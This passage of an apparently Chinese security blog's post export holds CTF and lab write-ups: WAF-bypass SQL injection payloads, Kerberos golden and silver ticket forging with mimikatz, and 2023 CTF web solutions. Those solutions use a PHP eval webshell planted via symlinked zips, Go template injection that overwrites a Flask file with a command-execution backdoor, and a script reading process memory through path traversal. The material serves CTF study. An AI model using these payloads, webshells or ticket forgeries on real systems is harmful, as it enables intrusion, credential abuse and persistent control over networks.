1id=1%00and 1=2 union select 1,2,column_name from information_schema.columns 9.溢出waf绕过部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测 1234?id=1+and+sleep(3) 绕过payload:?id=1+and+sleep(3)+and+111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111 10.协议未覆盖绕过以下四种常见的content-type类型： Content-Type:multipart&#x2F;form-data; Content-Type:application&#x2F;x-www-form-urlencoded Content-Type: text&#x2F;xml Content-Type: application&#x2F;json 部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换尝试去绕过WAF过滤机制。例如使用multipart&#x2F;form-data进行绕过。比如：sql第九关，正常情况下绕过之后 boundary边界混淆绕过在首个boundary分隔符号后添加英文逗号和任意干扰字符，且再增加一个boundary分隔符混淆，通过多boundary定义，使WAF检测范围和实际上传范围不一致，从而绕过WAF。 Cookie&#x2F;X-Forwarded-For注入绕过部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。 正常payload： 1234GET /index.aspx?id=1+and+1=1 HTTP/1.1Host: 192.168.61.175Cookie: TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28........... 绕过payload： 12345GET /index.aspx HTTP/1.1Host: 192.168.61.175Cookie:TOKEN=F6F57AD6473E851F5F8A0E7A64D01E28; id=1+and+1=1;X-Forwarded-For:127.0.0.1&#x27;;WAITFOR DELAY&#x27;0:0:5&#x27;--........... 利用pipline进行绕过当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。正常请求被拦截：利用pipline进行绕过：首先关闭burp的Repeater的Content-Length自动更新修改Connection字段值为keep-alive，将带有攻击语句的数据请求附加到正常请求后面再发送一遍。 分区块传输绕过分区块之后即可绕过 WAF和信息收集的联系WAF可以在信息收集阶段起到一定的作用。它可以检测和阻止一些常见的攻击技术，如SQL注入、跨站脚本（XSS）攻击、跨站请求伪造（CSRF）等。通过阻止这些攻击，WAF可以减少攻击者在信息收集阶段获得有关目标系统的敏感信息的机会。 此外，WAF还可以记录和分析攻击尝试的日志，从中获取有关攻击者的信息，例如攻击来源的IP地址、攻击的目标URL等。这些信息可以用于进一步的安全分析和对策制定。 WAF可以作为信息收集阶段的一种防御措施，帮助减少攻击者对目标系统的了解，并提供一定程度的安全保护。然而，需要注意的是，WAF并不能解决所有的安全问题，因此还需要综合其他安全措施来提高系统的整体安全性。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"域渗透--黄金票据和白银票据利用实验","slug":"黄金票据和白银票据利用实验","date":"2024-01-08T07:19:10.469Z","updated":"2024-01-08T07:24:41.385Z","comments":true,"path":"2024/01/08/黄金票据和白银票据利用实验/","link":"","permalink":"https://qingwan.top/2024/01/08/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C/","excerpt":"关于黄金票据和白银票据的复现","text":"关于黄金票据和白银票据的复现 实验环境 Windows Server 2016（域控机） Windows 10 x64 （域用户机） 票据传递攻击域渗透中的票据传递攻击（Kerberos Ticket Pass-The-Ticket Attack）是一种利用 Kerberos 身份验证系统中的漏洞来获取未授权访问权限的攻击技术。Kerberos 是一种常用的身份验证协议，用于在 Windows 域环境中进行用户认证和授权。 伪造黄金票据黄金票据攻击，针对:AS -&gt; TGT -&gt; ClientClient -&gt; TGT -&gt; TGS我们拿着伪造的TGT（也就是所谓的黄金票据），去请求TGS，然后TGS会给你你想要的访问任何服务的门票 前提条件黄金票据的利用的前提条件是你已经有一个普通域用户的权限，然后也有域内所有账户的hash，这时管理员在域内加固时忘记重置krbtgt的密码，在这些条件下，我们就可以伪造票据，并且利用这个票据去获得域管的权限，利用mimikatz这个工具用krbtgt的hash值去伪造生成任意TGT，所以黄金票据的伪造就相当于伪造TGT。所以需要的条件有：①域名称 ②域的SID ③域的krbtgt账户的hash 信息收集12#获得域名ipconfig /all 12#获得sidwhoami /all 12#然后用mimikatz软件拿到krbtgt用户的NTLM密码哈希 lsadump::dcsync /domian:wanyue.com /user:krbtgt krbtgt用户的NTLM密码hash不会轻易的改变 伪造票据用mimikatz伪造黄金票据并命名为lili 1kerberos::golden /admin:administrator /domain:wanyue.com /sid: S-1-5-21-517629535-2411917366-2305586266-500 /krbtgt:b6d25c8bed7d0d8c5ee8d7c0ae5c8dbf /ticket:ticket.lili 用mimikatz清除票据 12kerberos::purge \\\\清除票据kerberos::tgt \\\\查看票据 然后用mimikatz导入票据，如果ticket失效了，那就再次ptt导入ticket即可 1kerberos::ptt ticket.lili 然后就可以成功访问域控的共享文件夹了 1dir \\\\DC01\\c$ 伪造白银票据白银票据主要伪造的是ST(Service Ticket)，白银票据就针对是:TGS. -&gt; ST -&gt; ClientClient -&gt; ST -&gt; Service伪造出一张ST，就不用等TGS去发门票了，就可以自己去访问特点服务了黄金票据的攻击范围比白银票据的更广，因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。 前提条件123451.域名称 2.域的SID值 3.域中的Server服务器账户的NTLM-Hash 4.伪造的用户名，可以是任意用户名. 5.目标服务器上面的kerberos服务 信息收集12#拿到域控Ip和域名ipconfig /all 12#拿到SIDwhoami /all 123#用mimikatz导出域控的hashprivilege::debugsekurlsa::logonpasswords f125f3b9bf38df68580ed48019942360 伪造票证先用mimikat删除票据，然后再替换相应数据伪造票据 12345kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;用户名&gt; /ptt#这里的用户名可以随便写kerberos::golden /domain:wanyue.com /sid:S-1-5-21-517629535-2411917366-2305586266-500/target:OWA2010SP3.0day.org /service:cifs /rc4:f125f3b9bf38df68580ed48019942360 /user:silver /ptt 访问域控文件成功 黄金票据和白银票据的区别黄金票据（Golden Ticket）：攻击方式： 黄金票据攻击是通过直接抓取域控制器上 krbtgt 账户的哈希，然后在客户端生成一个伪造的 TGT 票据（门票发放票）。要和KDC交互，但是不和AS交互。凭据类型： 黄金票据攻击使用 krbtgt 账户的 NTLM 哈希来生成伪造的 TGT。攻击者在获取域管理员或域控制器凭据后，可以生成具有完全访问权限的伪造票据。影响范围： 黄金票据允许攻击者以伪造的身份访问域中的任何系统和服务，绕过身份验证过程，并操纵整个域环境。它对所有机器的所有服务都有效。 白银票据（Silver Ticket）：攻击方式： 白银票据攻击是在客户端利用已获取的域控制器服务账户的哈希来生成伪造的服务票据（ST 票据）。不和KDC交互，直接访问Server。凭据类型： 白银票据攻击使用服务账户的 NTLM 哈希来生成伪造的服务票据。攻击者在获取服务账户凭据后，可以生成伪造的服务票据，并通过它来访问受信任的服务。影响范围： 白银票据攻击允许攻击者以伪造的服务身份访问域中的受信任服务，而无需提供真实的凭据。但是，伪造的门票只对部分服务起作用，如文件共享服务（CIFS）、MSSQL、WinRM（Windows远程管理）、DNS等。 总结来说，黄金票据攻击直接抓取 krbtgt 账户的哈希，在客户端生成完全权限的伪造 TGT 票据，对所有机器的所有服务有效。而白银票据攻击利用已获取的服务账户的哈希 ，在客户端生成伪造的服务票据，对部分服务起作用，并且更加隐蔽，因为伪造的门票不经过 KDC。 黄金票据攻击和白银票据攻击主要是作用是权限维持，简单的意思就是，理论上，拿着这个票据，无论别人怎么查杀你，但是你还是可以靠着这张票据杀回去，然后拿着当初造的那张黄金票据随时回来接管域控的权限。","categories":[{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"}],"tags":[],"author":"Qingwan"},{"title":"2023国赛初赛复现wp--web","slug":"2023国赛wp","date":"2024-01-08T06:50:24.408Z","updated":"2024-01-08T07:11:29.446Z","comments":true,"path":"2024/01/08/2023国赛wp/","link":"","permalink":"https://qingwan.top/2024/01/08/2023%E5%9B%BD%E8%B5%9Bwp/","excerpt":"2023国赛初赛web","text":"2023国赛初赛web Unzip打开是一个文件上传界面这道题似乎是个原题先搜索一下题目，unzip，发现是Linux下用于解压压缩包的一个命令打开环境是一个文件上传页面先随便上传一个文件，点击上传之后会跳转到upload.php 12345678910 &lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123; exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);&#125;;//only this! 分析一下这段源码 1234567if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123; //finfo_file()函数用于验证MIME值，这里确定了要上传的文件类型为zip exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); //这里的意思是进入/tmp目录下后，调用unzip命令对压缩包进行解压 //-o 表示不必先询问用户，unzip执行后覆盖原有文件。&#125;; 总的意思就是，我们只能上传zip文件，并且上传之后zip文件会解压到&#x2F;tmp目录下，并且会覆盖原有文件那这样我们的思路就简单了，上传一个带有马的压缩包，然后再getshell即可但是上传之后却发现，我们不能访问&#x2F;tmp目录，所以我们就要进行绕过那绕过思路大概就是，有一个操作可以让我们对一个文件操作时让他作用在另一个目录或者文件下 软链接&#x2F;硬链接12345硬链接指通过索引节点来进行连接。比如：A 是 B 的硬链接（A 和 B 都是文件名），则 A 的目录项中的 inode 节点号与 B 的目录项中的 inode 节点号相同，即一个 inode 节点对应两个不同的文件名，两个文件名指向同一个文件，A 和 B 对文件系统来说是完全平等的。删除其中任何一个都不会影响另外一个的访问。创建命令 ： ln+原始文件 + 硬链接重命名文件软链接也叫符号链接。在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息。相当于创建一个快捷方式，记录原文件的位置，原文件删除，则该文件无法访问，有主次之分。就是可以将某个目录连接到另一个目录或者文件下，那么我们以后对这个目录的任何操作，都会作用到另一个目录或者文件下。创建命令 ： ln -s 原始文件路径 软链接后的路径 由上面可知我们这里需要用到软链接，那这样思路就清晰了，首先我们先上传一个带有软链接的压缩包(1.zip)，然后让其指向网站的根目录（&#x2F;var&#x2F;www&#x2F;html)，这样我们就可以通过访问该文件直接访问网站的目录了，然后我们再上传一个带有木马的压缩包(2.zip)，他的目录为1.zip的目录下。下面是具体实现： 软链接的利用和实现12345//创建软链接的压缩包，在linux命令行下输入下面的内容mkdir 1 //先创建一个目录来用于创建软链接cd 1ln -s /var/www/html QW //创建了一个名为QW的符号链接，该链接指向 /var/www/html 目录。zip --symlinks 1.zip QW //将QW目录及其所有内容压缩成一个名为 1.zip 的 ZIP 文件。 123456//创建包含木马文件的压缩包mkdir QW //这里创建的文件夹要和1.zip里的目录名一样cd QWecho &quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot; &gt; shell.php //在该目录下写入shell.php文件，内容为一句话木马cd .. //返回QW的上级目录zip -r 2.zip QW //将该目录压缩为2.zip文件 然后先上传1.zip文件，再上传2.zip文件，然后再getshell即可 12http://1.xx.xx.x:12345/shell.php //访问shell.php文件1=system(&quot;cat /flag&quot;); //同时post传参，得到flag flag{8382843b-d3e8-72fc-6625-ba5269953b23} gosession打开环境，显示 1Hello, guest 打开附件，查看main.go文件，发现主要有三个路由 Index Admin Flask123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778//rount.gopackage route import ( &quot;github.com/flosch/pongo2/v6&quot; &quot;github.com/gin-gonic/gin&quot; &quot;github.com/gorilla/sessions&quot; &quot;html&quot; &quot;io&quot; &quot;net/http&quot; &quot;os&quot; ) var store = sessions.NewCookieStore([]byte(os.Getenv(&quot;SESSION_KEY&quot;))) func Index(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; session.Values[&quot;name&quot;] = &quot;guest&quot; err = session.Save(c.Request, c.Writer) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; &#125; c.String(200, &quot;Hello, guest&quot;) &#125; func Admin(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] != &quot;admin&quot; &#123; http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError) return &#125; name := c.DefaultQuery(&quot;name&quot;, &quot;ssti&quot;) xssWaf := html.EscapeString(name) tpl, err := pongo2.FromString(&quot;Hello &quot; + xssWaf + &quot;!&quot;) if err != nil &#123; panic(err) &#125; out, err := tpl.Execute(pongo2.Context&#123;&quot;c&quot;: c&#125;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; c.String(200, out) &#125; func Flask(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; if err != nil &#123; http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError) return &#125; &#125; resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;)) if err != nil &#123; return &#125; defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) c.String(200, string(body)) &#125; 可以看到，Index路由中的session是guest用户的session，然后session_key是通过SESSION_KEY环境变量获取的Admin路由就是检测session，检测成功之后就ssti（需要name值为admin)，用xsswaf过滤了！并且里面调用了 pongo2 来实现模版解析Flask路由可以访问到本机5000端口的flask服务访问：1234567891011http://xxx/flask?name=//使name的值为空，会报错，信息泄露得到5000端口的源码，把得到的html源码去运行一下，得到下面的信息//这里为什么为空会报错？报错会得到源码呢？我在这道题的wp最后会做出解释。 // /app/server.py app = Flask(__name__) @app.route(&#x27;/&#x27;) def index(): name = request.args[&#x27;name&#x27;] return name + &quot; no ssti&quot; if __name__ == &quot;__main__&quot;: app.run(host=&quot;127.0.0.1&quot;, port=5000, debug=True) 这里看到flask开启了debug模式，等会要利用这个点,debug开启,代表开启了热加载功能，简单来说,就是允许在对代码进行更改后自动重新加载应用程序。os.Getenv 如果获取不存在的环境变量就会返回空值,所以我们这里猜其实不存在环境变量,所以secret_key其实是空的,那这样的话就可以伪造admin用户了 伪造admin用户我们改下代码,然后获得伪造之后的session 1234567891011121314151617181920var store = sessions.NewCookieStore([]byte(&quot;&quot;))// key设置为空func Index(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; session.Values[&quot;name&quot;] = &quot;admin&quot; // 将name改为admin err = session.Save(c.Request, c.Writer) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; &#125; c.String(200, &quot;Hello, guest&quot;)&#125; 得到伪造之后的session:(因为key为空，所以可以直接用别人生成的session) 1MTY4NTE2NjM0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwOKxem4pxrKun4XeKg9xm11WhWHL1uae0s725nzr61aA== 也可以把下面的代码加到rount.go里然后再访问,也可以得到admin用户的Key 123456func Key(c *gin.Context) &#123; session, _ := store.Get(c.Request, &quot;session-name&quot;) session.Values[&quot;name&quot;] = &quot;admin&quot; session.Save(c.Request, c.Writer) c.String(200, &quot;Hello, guest&quot;)&#125; 然后设置一下Cookie头到了这一步就开始go的ssti,前面已经说过了server.py开启了debug,所以说当server.py文件改变一次,那就会重新加载一次,所以我们这里就是要写入文件来覆盖掉原来的server.py文件 go的pongo2模板注入Go的标准库里有两个模板引擎, 分别是text/template和html/template, 两者接口一致, 区别在于html/template一般用于生成HTML输出, 它会自动转义单引号和双引号,所以我们这里要换个方式读取文件在这里我们发现gin.Context被注入到了模板中使用可以gin包的SaveUploadedFile（）进行文件上传 123456func (c *Context) SaveUploadedFile(file *multipart.FileHeader, dst string) error/*第一个获取表单中的文件，第二个参数为保存的目录即: &#123;&#123;c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)&#125;&#125;但是前面又提到html模板会对双引号进行编码,所以我们需要绕过*/ Context.HandlerName() HandlerName 返回主处理程序的名称。例如，如果处理程序是“handleGetUsers()”，此函数将返回“main.handleGetUsers”。 所以如果是在Admin()里，返回的就是main&#x2F;route.Admin然后配合过滤器last获取到最后一个字符串n 1&#123;&#123;c.HandlerName()|last&#125;&#125; 还有一个Context.Request.Referer()Request.Referer 返回header里的Referer的值 所以构建一个文件上传，然后覆盖server.py所以payload为:(来源为这里) 1/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125; 简单来说就是admin路由下有ssti,所以执行go的代码,然后上传server.py文件进行文件覆盖然后再访问&#x2F;flask路由来执行命令先执行上面的payload然后抓包:抓包之后主要有四步要修改 : 1.如果没有Referer头的话,记得添加Referer头,因为payload里的&#x2F;app&#x2F;server.py用Re头代替了Referer: &#x2F;app&#x2F;server.py 2.如果没有Content-Type头,记得添加Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundary8ALIn5Z2C3VlBqND 简单的来了解一下,为什么要加这个头:在http协议中使用form提交文件时需要将form标签的method属性设置为post，enctype属性设置为multipart&#x2F;form-data，并且有至少一个input的type属性为file时，浏览器提交这个form时会在请求头部的Content-Type中自动添加boundary属性。使用post上传文件时，不仅需要指定mutipart&#x2F;form-data来进行编码，还需要在Content-Type中定义boundary作为表单参数的分隔符。(简单的理解就是,这是我们用来上传文件的一个标志)并且请求体中不同部份以CRLF、”–”和header中的Boundary参数开头，要求被封装的内容不能出现与Boundary参数相同的字符，整个请求体以”–”结束。 3.记得把session改成我们之前伪造的那个admin的session 4.在body加上我们改之后的server.py文件,文件内容详见下面的包 下面是完整的发包 123456789101112131415161718192021222324252627282930313233GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125; HTTP/1.1Host: 1.14.xx.xx:12366Referer:/app/server.pyCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqNDAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: session-name=MTY4NTE2NjM0MXxEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkc1aGJXVUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwOKxem4pxrKun4XeKg9xm11WhWHL1uae0s725nzr61aA==Connection: closeContent-Length: 427------WebKitFormBoundary8ALIn5Z2C3VlBqNDContent-Disposition: form-data; name=&quot;n&quot;; filename=&quot;server.py&quot;Content-Type: text/plainfrom flask import *import osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def index(): name = request.args[&#x27;name&#x27;] file=os.popen(name).read() return fileif __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)------WebKitFormBoundary8ALIn5Z2C3VlBqND-- 发包成功之后,访问flask路由,执行下面的payload 123/flask?name=%3fname=env或者/flask?name=%3fname=cat$IFS/th1s_1s_f13g //要用$IFS绕过空格 得到flagflag{8382843b-d3e8-72fc-6625-ba5269953b23} 这个地方补充一下，为什么最后的payload是 1/flask?name=%3fname=env 有个师傅问我这里为什么是两个name连着写，这个payload怎么来的呢？我看到这个问题的时候，我简单的回想了一下这题的过程，然后去网上搜搜有没有相关的wp有解释，发现大家几乎都是一笔带过，也没有对这个点有过多的解释，当时自己可能也是网上说啥就是啥了，这样给我带来了一个提醒，复现的话就要每个点都吃透。好啦，开始解释吧，解决这个问题过程中我求助了一位师傅，感觉自己还是不太会抓问题重点我们先看到go里的flask路由那个地方 123456789101112131415161718func Flask(c *gin.Context) &#123; session, err := store.Get(c.Request, &quot;session-name&quot;) if err != nil &#123; http.Error(c.Writer, err.Error(), http.StatusInternalServerError) return &#125; if session.Values[&quot;name&quot;] == nil &#123; if err != nil &#123; http.Error(c.Writer, &quot;N0&quot;, http.StatusInternalServerError) return &#125; &#125; resp, err := http.Get(&quot;http://127.0.0.1:5000/&quot; + c.DefaultQuery(&quot;name&quot;, &quot;guest&quot;)) //这里是重点地方if err != nil &#123; return &#125; defer resp.Body.Close() body, _ := io.ReadAll(resp.Body) 我们看到上面标注的那行里的DefaultQuery，介于网上搜索到的相关知识点比较少，这里建议直接去看官方文档看到官方文档里的这几行上面几行注释就是几个例子，name和lastname是url上就有的参数，所以c.DefaultQuery(&quot;name&quot;, &quot;unknown&quot;) 直接返回的是url上给他的赋值，也就是Manu，同理，对于lastname的返回值也就是空，因为url上有这个参数但是确没有给他赋值，那对于url上不存在的参数呢，比如c.DefaultQuery(&quot;id&quot;, &quot;none&quot;)就为默认值，也就是defaultValue string，这里对于id来说，就是none那在这里我们最后的payload是/flask?name=%3fname=env，那拼接到这里就应该是http://127.0.0.1:5000?name=env，而这个时候的5000端口上的东西是我们之前覆盖的server.py文件，那我们看到我们覆盖的文件里的内容，我们传参name，并且去os.popen代码执行这个参数的指令 所以/flask?name=%3fname=env其实就是/server.py?name=env，从而读取了环境变量了。其实这里我们上传的server.py文件里面最好不要设置成name这个参数，感觉可能是两个name连着一起有点误导人了可以改个参数，比如把上面的一段，改成下面这样，这样最后payload就是/flask?name=?cmd=env 12345@app.route(&#x27;/&#x27;) def index(): cmd = request.args[&#x27;cmd&#x27;] file=os.popen(cmd).read() return file 看到这里你会不会还有点懵？那再来好好理一遍这个思路。首先我们从浏览器访问，然后传参，route.go接收到用户访问的url之后，通过DefaultQuery裁切url上的参数，然后将返回的值拼接给本地的flask服务，flask服务默认在5000端口开启，所以也就是 127.0.0.1:5000，所以Payload：/flask?name=%3fname=env，经过第一层route.go里面的DefaultQuery裁切之后，只剩下%3fname=env，然后这一段拼接给flask，这时候触发了覆盖的server.py文件，进而执行了命令，查看到了环境变量。这样一遍理下来就很清楚啦。看到这里你会不会联想到一开始的这里为什么会报错，报错之后为什么又可以得到源码呢？这里我们把/?flask?name按照我们刚刚的思路，是不是最后就是127.0.0.1:5000了，因为name为空，所以后面自然也没有跟东西，我们看到获取name参数值的地方我们把这段代码拿去测试一下，正常赋值，没问题当为空的时候，也就是直接?name的时候，可以看到报错了是因为这个地方想要name参数，但是没有得到，所以这也是为什么我们会传两个name参数的原因那为什么报错了就会得到源码呢，因为这里打开了flask的debug模式，报错了就会直接回显源码 其实这道题还有另外的解法，就是如果我们都可以命令执行了，那想到之前师傅说的一个小点子，用grep直接全局查找不就好了？这样也不用去研究那么多东西了，直接 file=os.popen(“grep -R flag”).read()然后直接访问直接访问 /flask?name=，变成127.0.0.1:5000，触发命令执行，回显flag reading主页是空白的,就想到可能是目录穿越,这里把..replace成了. 所以我们要用…代表一级先看到app.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101# -*- coding:utf8 -*- import os import math import time import hashlib from flask import Flask, request, session, render_template, send_file from datetime import datetime app = Flask(__name__) app.secret_key = hashlib.md5(os.urandom(32)).hexdigest() key = hashlib.md5(str(time.time_ns()).encode()).hexdigest() books = os.listdir(&#x27;./books&#x27;) books.sort(reverse=True) @app.route(&#x27;/&#x27;) def index(): if session: book = session[&#x27;book&#x27;] page = session[&#x27;page&#x27;] page_size = session[&#x27;page_size&#x27;] total_pages = session[&#x27;total_pages&#x27;] filepath = session[&#x27;filepath&#x27;] words = read_file_page(filepath, page, page_size) return render_template(&#x27;index.html&#x27;, books=books, words=words) return render_template(&#x27;index.html&#x27;, books=books ) @app.route(&#x27;/books&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def book_page(): if request.args.get(&#x27;book&#x27;): book = request.args.get(&#x27;book&#x27;) elif session: book = session.get(&#x27;book&#x27;) else: return render_template(&#x27;index.html&#x27;, books=books, message=&#x27;I need book&#x27;) book=book.replace(&#x27;..&#x27;,&#x27;.&#x27;) filepath = &#x27;./books/&#x27; + book if request.args.get(&#x27;page_size&#x27;): page_size = int(request.args.get(&#x27;page_size&#x27;)) elif session: page_size = int(session.get(&#x27;page_size&#x27;)) else: page_size = 3000 total_pages = math.ceil(os.path.getsize(filepath) / page_size) if request.args.get(&#x27;page&#x27;): page = int(request.args.get(&#x27;page&#x27;)) elif session: page = int(session.get(&#x27;page&#x27;)) else: page = 1 words = read_file_page(filepath, page, page_size) prev_page = page - 1 if page &gt; 1 else None next_page = page + 1 if page &lt; total_pages else None session[&#x27;book&#x27;] = book session[&#x27;page&#x27;] = page session[&#x27;page_size&#x27;] = page_size session[&#x27;total_pages&#x27;] = total_pages session[&#x27;prev_page&#x27;] = prev_page session[&#x27;next_page&#x27;] = next_page session[&#x27;filepath&#x27;] = filepath return render_template(&#x27;index.html&#x27;, books=books, words=words ) @app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def flag(): if hashlib.md5(session.get(&#x27;key&#x27;).encode()).hexdigest() == key: return os.popen(&#x27;/readflag&#x27;).read() else: return &quot;no no no&quot; def read_file_page(filename, page_number, page_size): for i in range(3): for j in range(3): size=page_size + j offset = (page_number - 1) * page_size+i try: with open(filename, &#x27;rb&#x27;) as file: file.seek(offset) words = file.read(size) return words.decode().split(&#x27;\\n&#x27;) except Exception as e: pass #if error again offset = (page_number - 1) * page_size with open(filename, &#x27;rb&#x27;) as file: file.seek(offset) words = file.read(page_size) return words.split(b&#x27;\\n&#x27;) if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=&#x27;8000&#x27;) 这里看到要获得flag,则需要key,而key又是通过session获得的,想要伪造session我们又需要知道secret_key首先我们先来了解两个路径 1234567/proc/self路径为获取当前环境下的文件,比如/proc/self/environ用于获取当前环境下的环境变量/proc/self/maps:maps显示当前进程各虚拟地址段的属性，包括虚拟地址段的起始终止地址、读写执行属性、vm_pgoff、主从设备号、i_ino、文件名。基于里面信息能大概判断泄露的内存的属性，是哪个区域在泄漏、对应哪个文件。辅助工具procmem输出更可读的maps信息。/proc/self/mem:/proc/self/men这个文件是一个特殊的文件,它允许对当前的进程的内存进行直接读取和写入操作,通过读写这个文件,可以访问当前进程的完整内存空间,包括代码段,数据段,堆,栈和其他映射的内存区域 所以我们输入下面的payload读取一下: 1/books?book=.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../.../proc/self/maps 那么总的思路就是:思路就是利用任意文件读取读 &#x2F;proc&#x2F;self&#x2F;maps 获取 python 相关程序的地址然后读 &#x2F;proc&#x2F;self&#x2F;mem 拿到堆里面的 secret key 和 key, 伪造 session 最后访问 &#x2F;flag 路由 任意文件读取下面放上读men的脚本记得要在linux下执行 1234567891011121314151617181920212223242526272829303132333435363738394041424344import os,requests,redef dowload(file,offset=0,length=0): if offset: page = int(offset) // int(length) print(f&quot;&#123;url&#125;books?book=.../.../.../.../...&#123;file&#125;&amp;page=&#123;str(page)&#125;&amp;page_size=&#123;length&#125;&quot;) res=requests.get(f&quot;&#123;url&#125;books?book=.../.../.../.../...&#123;file&#125;&amp;page=&#123;str(page)&#125;&amp;page_size=&#123;length&#125;&quot;) else: res = requests.get(f&quot;&#123;url&#125;books?book=.../.../.../.../...&#123;file&#125;&amp;page=1&amp;page_size=2000000000&quot;) text=res.text return texturl=&quot;http://1.1.1.1:12345/&quot;# 读取/proc/self/mapsmaps = open(f&#x27;maps&#x27;, &#x27;wb&#x27;)maps.write(dowload(&quot;/proc/self/maps&quot;).encode())maps.close()# 清空本地save目录os.system(&quot;rm -rf ./save;mkdir save&quot;)for i in open(&#x27;maps&#x27;,&#x27;r&#x27;).read().split(&#x27;\\n&#x27;): if &quot;.so&quot; in i or &quot;lib&quot; in i or&quot;python3&quot; in i or&quot;dev&quot; in i: continue t = re.search(r&#x27;[0-9a-f]&#123;12&#125;-[0-9a-f]&#123;12&#125;&#x27;, i) if t: location = t.group().split(&quot;-&quot;) else: continue try: start, end=&quot;0x&quot;+location[0],&quot;0x&quot;+location[1] except: continue print(&quot;./save/&quot;+start+&quot;-&quot;+end) save = open( &quot;./save/&quot;+start+&quot;-&quot;+end,&quot;wb&quot; ) save.write( dowload( &quot;/proc/self/mem&quot;, str(int(start,16)), str(int(end,16)-int(start,16)) ).encode() ) 运行之后会生成一个save文件夹，然后打开这个文件夹然后用正则表达式 – 